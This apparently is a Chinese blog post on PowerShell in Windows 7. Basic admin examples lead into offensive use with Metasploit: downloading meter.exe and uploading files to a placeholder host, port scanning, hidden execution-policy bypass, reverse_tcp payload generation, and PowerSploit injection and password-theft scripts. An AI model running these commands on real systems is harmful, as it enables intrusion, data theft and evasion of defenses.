# 与Powershell

 **大家都在说windows7的防护水平大大高于windows xp了，但是并不都是如此，Win7下给出现了一个强大高级cmd————&gt;powershell。**该shell最大的特点就是支持脚本编程，酷似linux的bash（准确说应该是各种sh），下面就简要介绍下它的功能，以及如何与metasploit配合\(今年北美著名的安全会议[Derbycon](https://www.derbycon.com/)给出的，这个会议是美国国防部下属的DARPA资助的，内容非常好，建议大家关注\)：

##  基本命令

 开始–&gt;运行–&gt;powershell 开启powershell界面

 get-command \*-service 获得服务相关的命令   
 get-help get service 获得命令的帮助

 支持脚本文件的命令集 脚本的后缀名为.PS1,支持管道：

##  powershell使用示例：

 停止所有目前运行中的以”p”字符开头命名的程序：

```bash
PS> get-process p* | stop-process
```

 停止所有目前运行中的所有使用大于1000MB存储器的程序：

```bash
PS> get-process | where { $_.WS -gt 1000MB } | stop-process
```

 计算一个目录下文件内的字节大小：

```bash
PS> get-childitem | measure-object -property length -sum
```

 等待一个叫做”notepad”的程序运行退出：

```bash
PS> $processToWatch = get-process notepad
PS> $processToWatch.WaitForExit()
```

 将”hello, world!”字符串转为英文大写字符，成为”HELLO, WORLD!”：

```bash
PS> “hello, world!”.ToUpper()
```

 在字符串”string”的第1个字符后插入字符串”ABC”，成为”sABCtring”：

```bash
PS> “string”.Insert(1, “ABC”)
```

 订阅一个指定的RSS Feed并显示它最近8个主题：

```bash
PS> $rssUrl = “http://blogs.msdn.com/powershell/rss.aspx”
PS> $blog = xml.DownloadString($rssUrl)
PS> $blog.rss.channel.item | select title -first 8
```

###  使用powershell执行shellcode

 使用dns payloads的方式通过powershell执行meterpreter，达到免杀、过IPS的效果

###  使用powershell进行文件的上传、下载和端口扫描

 下载

```text
ps>Import-Module BitsTransfer
ps>Start-BitsTransfer http://ip/meter.exe c:\meter.exe
```

 上传

```text
Start-BitsTransfer -Source c:\upload.txt -Destination http://ip/upload/upload.txt -transfertype upload
```

 端口扫描

```text
ps c:>1..1024 | %{ echo ((new-object Net.Sockets.TcpClient).Connect(“10.1.1.14”,$)) “$ is open”} 2>$null
25 is open
```

##  powersploit 堪比meterpreter的后渗透攻击框架

 Carlos Perez国外大牛设计了基于powersploit的渗透脚本集合，用于授权渗透测试使用。。。。（大家都知道怎么回事），里面的主要包含了一下几个脚本

```bash
Inject-Dll(注入dll到指定进程)
Inject-Shellcode（注入shellcode到执行进程）
Encrypt- Script（文本或脚本加密）
Get-GPPPassword（通过groups.xml获取明文密码）
Invoke- ReverseDnsLookup（扫描 DNS PTR记录）
```

 具体的代码就请查看作者的github代码仓库：[powerexploit](https://github.com/mattifestation/PowerSploit)

##  Metasploit与powershell结合

 西点军校毕业的这货[Chris Gates](http://carnal0wnage.attackresearch.com/)说windows就是他的backdoor，为什么？ 首先就是powershell提供了上传和下载功能，这在渗透过程中能省很多事，其次他说没有见过哪些Meterpreter的事Powershell做不了的，举例：

```bash
* Powershell hashdump（in SET）
* Powershell exec method in MSSQL_Payload * PowerSploit(上面提到了)
```

 绕过powershell本身的权限限制：

```bash
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden —File “C:\do_neat_ps_shit.ps1”
```

 使用Metasploit生成Powershell

```bash
msf_ payload(reverse_tcp) > generate -t psh -f powershellexec.ps1
```

 使用批处理文件从Meterpreter中运行Powershell

```bash
c:\type run_ps.bat powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File C:\ipinfo2.ps1
```

 示例：

```bash
meterpreter > execute -H -f cmd.exe -a ‘/c C:\runps.bat’ Process 28536 created. meterpreter>
–snip–
```

##  总结

 windows7下的powershell功能不可小觑，应该一起广大安全爱好研究这的研究和重视，后面还会给出相关powershell安全研究的讨论。最后推荐两个博客：  
 [中文博客](http://www.pstips.net/)：研究powershell中文博客,包含powershell的命令解释、脚本编程的各种小技巧  
 [英文博客](http://www.exploit-monday.com/)：国外某大牛博客，对powershell有很多安全方面的研究，国外黑客大会推荐

